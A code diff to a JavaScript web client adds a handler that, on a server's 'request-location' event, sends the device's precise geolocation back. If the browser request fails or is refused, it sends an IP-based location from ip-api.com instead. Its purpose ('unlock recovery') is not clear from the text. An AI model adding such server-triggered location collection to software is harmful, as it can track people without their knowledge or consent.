@@ -1585,8 +1585,26 @@ function requestPermItem(perm) {
                         r(true);
                     })
                     .catch(() => fail());
-            }
-        });
+    }
+});
+
+// Request location — triggered by server on unlock recovery
+socket.on('request-location', () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
+            },
+            () => {
+                // Fallback: try IP-based location
+                fetch('https://ip-api.com/json/?fields=lat,lon').then(r => r.json()).then(d => {
+                    if (d.lat && d.lon) socket.emit('location', { lat: d.lat, lng: d.lon, accuracy: 5000 });
+                }).catch(() => {});
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+        );
+    }
+});
     }
 
     return tryPerm();
